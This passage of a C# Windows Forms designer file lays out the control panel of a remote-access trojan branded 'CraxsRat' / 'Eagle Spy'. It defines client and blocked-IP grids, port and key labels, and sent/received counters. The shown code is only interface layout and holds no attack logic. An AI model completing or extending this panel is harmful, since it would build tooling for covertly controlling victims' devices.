            this.checksavepass.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checksavepass.Checked = true;
            this.checksavepass.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checksavepass.Font = new System.Drawing.Font("Calibri", 12F);
            this.checksavepass.Location = new System.Drawing.Point(264, 6);
            this.checksavepass.Margin = new System.Windows.Forms.Padding(4);
            this.checksavepass.Name = "checksavepass";
            this.checksavepass.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
            this.checksavepass.Size = new System.Drawing.Size(125, 31);
            this.checksavepass.Style = DrakeUI.Framework.UIStyle.Custom;
            this.checksavepass.TabIndex = 53;
            this.checksavepass.Text = "Remember";
            // 
            // DrakeUIAvatar2
            // 
            this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.DrakeUIAvatar2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.DrakeUIAvatar2.Location = new System.Drawing.Point(1341, 4);
            this.DrakeUIAvatar2.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
            this.DrakeUIAvatar2.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.DrakeUIAvatar2.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIAvatar2.Size = new System.Drawing.Size(35, 30);
            this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar2.Symbol = 61526;
            this.DrakeUIAvatar2.TabIndex = 58;
            this.DrakeUIAvatar2.Click += new System.EventHandler(this.Rempo_Click);
            // 
            // checkenablelogs
            // 
            this.checkenablelogs.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.checkenablelogs.Checked = true;
            this.checkenablelogs.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkenablelogs.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkenablelogs.ForeColor = System.Drawing.Color.White;
            this.checkenablelogs.Location = new System.Drawing.Point(1700, 290);
            this.checkenablelogs.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.checkenablelogs.Name = "checkenablelogs";
            this.checkenablelogs.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
            this.checkenablelogs.Size = new System.Drawing.Size(109, 30);
            this.checkenablelogs.Style = DrakeUI.Framework.UIStyle.Custom;
            this.checkenablelogs.StyleCustomMode = true;
            this.checkenablelogs.TabIndex = 0;
            this.checkenablelogs.Text = "Enabled";
            this.checkenablelogs.Visible = false;
            // 
            // checkclearlogs
            // 
            this.checkclearlogs.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.checkclearlogs.Checked = true;
            this.checkclearlogs.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkclearlogs.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkclearlogs.ForeColor = System.Drawing.Color.White;
            this.checkclearlogs.Location = new System.Drawing.Point(1847, 293);
            this.checkclearlogs.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.checkclearlogs.Name = "checkclearlogs";
            this.checkclearlogs.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
            this.checkclearlogs.Size = new System.Drawing.Size(137, 27);
            this.checkclearlogs.Style = DrakeUI.Framework.UIStyle.Custom;
            this.checkclearlogs.StyleCustomMode = true;
            this.checkclearlogs.TabIndex = 1;
            this.checkclearlogs.Text = "Auto Clean";
            this.checkclearlogs.Visible = false;
            // 
            // bigtitletext
            // 
            this.bigtitletext.BackColor = System.Drawing.Color.Black;
            this.bigtitletext.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.bigtitletext.ForeColor = System.Drawing.Color.Lime;
            this.bigtitletext.Location = new System.Drawing.Point(144, 202);
            this.bigtitletext.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.bigtitletext.Name = "bigtitletext";
            this.bigtitletext.Size = new System.Drawing.Size(139, 30);
            this.bigtitletext.TabIndex = 39;
            this.bigtitletext.Text = "CraxsRat";
            this.bigtitletext.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.bigtitletext.Visible = false;
            this.bigtitletext.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Bigtitletext_MouseDown);
            // 
            // panel8
            // 
            this.panel8.Controls.Add(this.guna2ShadowPanel4);
            this.panel8.Controls.Add(this.guna2ShadowPanel3);
            this.panel8.Controls.Add(this.guna2ShadowPanel2);
            this.panel8.Controls.Add(this.guna2ShadowPanel1);
            this.panel8.Location = new System.Drawing.Point(0, 518);
            this.panel8.Margin = new System.Windows.Forms.Padding(4);
            this.panel8.Name = "panel8";
            this.panel8.Size = new System.Drawing.Size(1421, 161);
            this.panel8.TabIndex = 0;
            // 
            // guna2ShadowPanel4
            // 
            this.guna2ShadowPanel4.BackColor = System.Drawing.Color.Transparent;
            this.guna2ShadowPanel4.Controls.Add(this.drakeUILabel7);
            this.guna2ShadowPanel4.Controls.Add(this.pictureBox14);
            this.guna2ShadowPanel4.Controls.Add(this.drakeUILabel6);
            this.guna2ShadowPanel4.Controls.Add(this.drakeUILabel2);
            this.guna2ShadowPanel4.Controls.Add(this.pictureBox6);
            this.guna2ShadowPanel4.Controls.Add(this.drakeUILabel3);
            this.guna2ShadowPanel4.FillColor = System.Drawing.Color.Black;
            this.guna2ShadowPanel4.ForeColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel4.Location = new System.Drawing.Point(1100, 15);
            this.guna2ShadowPanel4.Margin = new System.Windows.Forms.Padding(4);
            this.guna2ShadowPanel4.Name = "guna2ShadowPanel4";
            this.guna2ShadowPanel4.ShadowColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel4.Size = new System.Drawing.Size(307, 135);
            this.guna2ShadowPanel4.TabIndex = 143;
            // 
            // drakeUILabel7
            // 
            this.drakeUILabel7.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel7.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel7.Location = new System.Drawing.Point(84, 36);
            this.drakeUILabel7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel7.Name = "drakeUILabel7";
            this.drakeUILabel7.Size = new System.Drawing.Size(40, 25);
            this.drakeUILabel7.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel7.TabIndex = 149;
            this.drakeUILabel7.Text = "....";
            this.drakeUILabel7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // pictureBox14
            // 
            this.pictureBox14.Image = global::Eagle_Spy_Applications.Screenshot_8;
            this.pictureBox14.Location = new System.Drawing.Point(4, 4);
            this.pictureBox14.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox14.Name = "pictureBox14";
            this.pictureBox14.Size = new System.Drawing.Size(92, 28);
            this.pictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox14.TabIndex = 153;
            this.pictureBox14.TabStop = false;
            // 
            // drakeUILabel6
            // 
            this.drakeUILabel6.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel6.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel6.Location = new System.Drawing.Point(84, 60);
            this.drakeUILabel6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel6.Name = "drakeUILabel6";
            this.drakeUILabel6.Size = new System.Drawing.Size(40, 25);
            this.drakeUILabel6.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel6.TabIndex = 148;
            this.drakeUILabel6.Text = "....";
            this.drakeUILabel6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUILabel2
            // 
            this.drakeUILabel2.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel2.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel2.Location = new System.Drawing.Point(84, 90);
            this.drakeUILabel2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel2.Name = "drakeUILabel2";
            this.drakeUILabel2.Size = new System.Drawing.Size(40, 25);
            this.drakeUILabel2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel2.TabIndex = 147;
            this.drakeUILabel2.Text = "....";
            this.drakeUILabel2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // pictureBox6
            // 
            this.pictureBox6.Image = global::Eagle_Spy_Applications.Screenshot_4;
            this.pictureBox6.Location = new System.Drawing.Point(216, 31);
            this.pictureBox6.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox6.Name = "pictureBox6";
            this.pictureBox6.Size = new System.Drawing.Size(77, 76);
            this.pictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox6.TabIndex = 146;
            this.pictureBox6.TabStop = false;
            // 
            // drakeUILabel3
            // 
            this.drakeUILabel3.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel3.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel3.Location = new System.Drawing.Point(84, 31);
            this.drakeUILabel3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel3.Name = "drakeUILabel3";
            this.drakeUILabel3.Size = new System.Drawing.Size(40, 25);
            this.drakeUILabel3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel3.TabIndex = 78;
            this.drakeUILabel3.Text = "....";
            this.drakeUILabel3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.drakeUILabel3.Visible = false;
            // 
            // guna2ShadowPanel3
            // 
            this.guna2ShadowPanel3.BackColor = System.Drawing.Color.Transparent;
            this.guna2ShadowPanel3.Controls.Add(this.pictureBox13);
            this.guna2ShadowPanel3.Controls.Add(this.pictureBox7);
            this.guna2ShadowPanel3.Controls.Add(this.label1);
            this.guna2ShadowPanel3.Controls.Add(this.label9);
            this.guna2ShadowPanel3.FillColor = System.Drawing.Color.Black;
            this.guna2ShadowPanel3.ForeColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel3.Location = new System.Drawing.Point(736, 17);
            this.guna2ShadowPanel3.Margin = new System.Windows.Forms.Padding(4);
            this.guna2ShadowPanel3.Name = "guna2ShadowPanel3";
            this.guna2ShadowPanel3.ShadowColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel3.Size = new System.Drawing.Size(307, 130);
            this.guna2ShadowPanel3.TabIndex = 143;
            // 
            // pictureBox13
            // 
            this.pictureBox13.Image = global::Eagle_Spy_Applications.Screenshot_7;
            this.pictureBox13.Location = new System.Drawing.Point(0, 0);
            this.pictureBox13.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox13.Name = "pictureBox13";
            this.pictureBox13.Size = new System.Drawing.Size(107, 30);
            this.pictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox13.TabIndex = 152;
            this.pictureBox13.TabStop = false;
            // 
            // pictureBox7
            // 
            this.pictureBox7.Image = global::Eagle_Spy_Applications.Screenshot_3;
            this.pictureBox7.Location = new System.Drawing.Point(212, 28);
            this.pictureBox7.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox7.Name = "pictureBox7";
            this.pictureBox7.Size = new System.Drawing.Size(77, 76);
            this.pictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox7.TabIndex = 147;
            this.pictureBox7.TabStop = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(137, 64);
            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(43, 29);
            this.label1.TabIndex = 141;
            this.label1.Text = "On";
            this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.Color.White;
            this.label9.Location = new System.Drawing.Point(19, 64);
            this.label9.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(111, 29);
            this.label9.TabIndex = 143;
            this.label9.Text = "Received:";
            // 
            // guna2ShadowPanel2
            // 
            this.guna2ShadowPanel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2ShadowPanel2.Controls.Add(this.pictureBox8);
            this.guna2ShadowPanel2.Controls.Add(this.label8);
            this.guna2ShadowPanel2.Controls.Add(this.pictureBox12);
            this.guna2ShadowPanel2.Controls.Add(this.label2);
            this.guna2ShadowPanel2.FillColor = System.Drawing.Color.Black;
            this.guna2ShadowPanel2.ForeColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel2.Location = new System.Drawing.Point(365, 17);
            this.guna2ShadowPanel2.Margin = new System.Windows.Forms.Padding(4);
            this.guna2ShadowPanel2.Name = "guna2ShadowPanel2";
            this.guna2ShadowPanel2.ShadowColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel2.Size = new System.Drawing.Size(307, 133);
            this.guna2ShadowPanel2.TabIndex = 142;
            // 
            // pictureBox8
            // 
            this.pictureBox8.Image = global::Eagle_Spy_Applications.Screenshot_2;
            this.pictureBox8.Location = new System.Drawing.Point(211, 28);
            this.pictureBox8.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox8.Name = "pictureBox8";
            this.pictureBox8.Size = new System.Drawing.Size(77, 76);
            this.pictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox8.TabIndex = 148;
            this.pictureBox8.TabStop = false;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(35, 64);
            this.label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(66, 29);
            this.label8.TabIndex = 135;
            this.label8.Text = "Sent:";
            // 
            // pictureBox12
            // 
            this.pictureBox12.Image = global::Eagle_Spy_Applications.Screenshot_6;
            this.pictureBox12.Location = new System.Drawing.Point(7, 4);
            this.pictureBox12.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox12.Name = "pictureBox12";
            this.pictureBox12.Size = new System.Drawing.Size(81, 26);
            this.pictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox12.TabIndex = 151;
            this.pictureBox12.TabStop = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Candara", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(109, 64);
            this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(43, 29);
            this.label2.TabIndex = 142;
            this.label2.Text = "On";
            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // guna2ShadowPanel1
            // 
            this.guna2ShadowPanel1.BackColor = System.Drawing.Color.Transparent;
            this.guna2ShadowPanel1.Controls.Add(this.pictureBox10);
            this.guna2ShadowPanel1.Controls.Add(this.label10);
            this.guna2ShadowPanel1.Controls.Add(this.label7);
            this.guna2ShadowPanel1.Controls.Add(this.pictureBox11);
            this.guna2ShadowPanel1.Controls.Add(this.label6);
            this.guna2ShadowPanel1.Controls.Add(this.drakeUILabel1);
            this.guna2ShadowPanel1.Controls.Add(this.drakeUILabel4);
            this.guna2ShadowPanel1.FillColor = System.Drawing.Color.Black;
            this.guna2ShadowPanel1.ForeColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel1.Location = new System.Drawing.Point(13, 17);
            this.guna2ShadowPanel1.Margin = new System.Windows.Forms.Padding(4);
            this.guna2ShadowPanel1.Name = "guna2ShadowPanel1";
            this.guna2ShadowPanel1.ShadowColor = System.Drawing.Color.Red;
            this.guna2ShadowPanel1.Size = new System.Drawing.Size(307, 133);
            this.guna2ShadowPanel1.TabIndex = 141;
            // 
            // pictureBox10
            // 
            this.pictureBox10.Image = global::Eagle_Spy_Applications.Screenshot_1;
            this.pictureBox10.Location = new System.Drawing.Point(211, 28);
            this.pictureBox10.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox10.Name = "pictureBox10";
            this.pictureBox10.Size = new System.Drawing.Size(77, 76);
            this.pictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox10.TabIndex = 149;
            this.pictureBox10.TabStop = false;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Candara", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.ForeColor = System.Drawing.Color.Transparent;
            this.label10.Location = new System.Drawing.Point(39, 4);
            this.label10.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(0, 21);
            this.label10.TabIndex = 135;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(36, 34);
            this.label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(90, 29);
            this.label7.TabIndex = 134;
            this.label7.Text = "Online:";
            // 
            // pictureBox11
            // 
            this.pictureBox11.BackColor = System.Drawing.Color.Black;
            this.pictureBox11.Image = global::Eagle_Spy_Applications.Screenshot_5;
            this.pictureBox11.Location = new System.Drawing.Point(4, 5);
            this.pictureBox11.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox11.Name = "pictureBox11";
            this.pictureBox11.Size = new System.Drawing.Size(69, 26);
            this.pictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox11.TabIndex = 150;
            this.pictureBox11.TabStop = false;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(128, 37);
            this.label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(41, 25);
            this.label6.TabIndex = 133;
            this.label6.Text = "On";
            // 
            // drakeUILabel1
            // 
            this.drakeUILabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel1.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel1.Location = new System.Drawing.Point(40, 65);
            this.drakeUILabel1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel1.Name = "drakeUILabel1";
            this.drakeUILabel1.Size = new System.Drawing.Size(132, 25);
            this.drakeUILabel1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel1.TabIndex = 76;
            this.drakeUILabel1.Text = "Port : ";
            this.drakeUILabel1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUILabel4
            // 
            this.drakeUILabel4.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel4.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.drakeUILabel4.Location = new System.Drawing.Point(40, 89);
            this.drakeUILabel4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel4.Name = "drakeUILabel4";
            this.drakeUILabel4.Size = new System.Drawing.Size(132, 25);
            this.drakeUILabel4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel4.TabIndex = 79;
            this.drakeUILabel4.Text = "Key : ";
            this.drakeUILabel4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // label16
            // 
            this.label16.Font = new System.Drawing.Font("Times New Roman", 10F);
            this.label16.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.label16.Location = new System.Drawing.Point(1503, 770);
            this.label16.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(119, 27);
            this.label16.TabIndex = 20;
            this.label16.Text = "CeaxsRat Vip";
            this.label16.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.label16.Click += new System.EventHandler(this.label16_Click);
            // 
            // DGVblocked
            // 
            this.DGVblocked.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.DGVblocked.AllowUserToAddRows = false;
            this.DGVblocked.AllowUserToDeleteRows = false;
            this.DGVblocked.AllowUserToResizeColumns = false;
            this.DGVblocked.AllowUserToResizeRows = false;
            dataGridViewCellStyle6.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle6.ForeColor = System.Drawing.Color.Cyan;
            dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.Black;
            this.DGVblocked.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
            this.DGVblocked.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVblocked.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVblocked.BackgroundColor = System.Drawing.Color.Black;
            this.DGVblocked.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVblocked.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
            this.DGVblocked.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVblocked.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.DataGridViewImageColumn1,
            this.DataGridViewTextBoxColumn1});
            this.DGVblocked.ContextMenuStrip = this.ctxconnection;
            this.DGVblocked.Cursor = System.Windows.Forms.Cursors.Hand;
            dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle8.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVblocked.DefaultCellStyle = dataGridViewCellStyle8;
            this.DGVblocked.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGVblocked.EnableHeadersVisualStyles = false;
            this.DGVblocked.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DGVblocked.Location = new System.Drawing.Point(197, 87);
            this.DGVblocked.Margin = new System.Windows.Forms.Padding(4);
            this.DGVblocked.MultiSelect = false;
            this.DGVblocked.Name = "DGVblocked";
            this.DGVblocked.ReadOnly = true;
            this.DGVblocked.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle9.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVblocked.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
            this.DGVblocked.RowHeadersVisible = false;
            this.DGVblocked.RowHeadersWidth = 62;
            dataGridViewCellStyle10.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle10.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.DGVblocked.RowsDefaultCellStyle = dataGridViewCellStyle10;
            this.DGVblocked.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVblocked.ShowCellToolTips = false;
            this.DGVblocked.Size = new System.Drawing.Size(1420, 666);
            this.DGVblocked.TabIndex = 2;
            this.DGVblocked.Tag = "b";
            // 
            // DataGridViewImageColumn1
            // 
            this.DataGridViewImageColumn1.FillWeight = 50.76142F;
            this.DataGridViewImageColumn1.HeaderText = "Flag";
            this.DataGridViewImageColumn1.MinimumWidth = 8;
            this.DataGridViewImageColumn1.Name = "DataGridViewImageColumn1";
            this.DataGridViewImageColumn1.ReadOnly = true;
            // 
            // DataGridViewTextBoxColumn1
            // 
            this.DataGridViewTextBoxColumn1.FillWeight = 149.2386F;
            this.DataGridViewTextBoxColumn1.HeaderText = "ip";
            this.DataGridViewTextBoxColumn1.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1";
            this.DataGridViewTextBoxColumn1.ReadOnly = true;
            // 
            // ClientsWindow
            // 
            this.ClientsWindow.AllowUserToAddRows = false;
            this.ClientsWindow.AllowUserToDeleteRows = false;
            this.ClientsWindow.AllowUserToResizeColumns = false;
            this.ClientsWindow.AllowUserToResizeRows = false;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle1.Font = new System.Drawing.Font("Calibri", 9F);
            dataGridViewCellStyle1.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.White;
            this.ClientsWindow.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
            this.ClientsWindow.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.ClientsWindow.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.ClientsWindow.BackgroundColor = System.Drawing.Color.Black;
            this.ClientsWindow.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.ClientsWindow.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
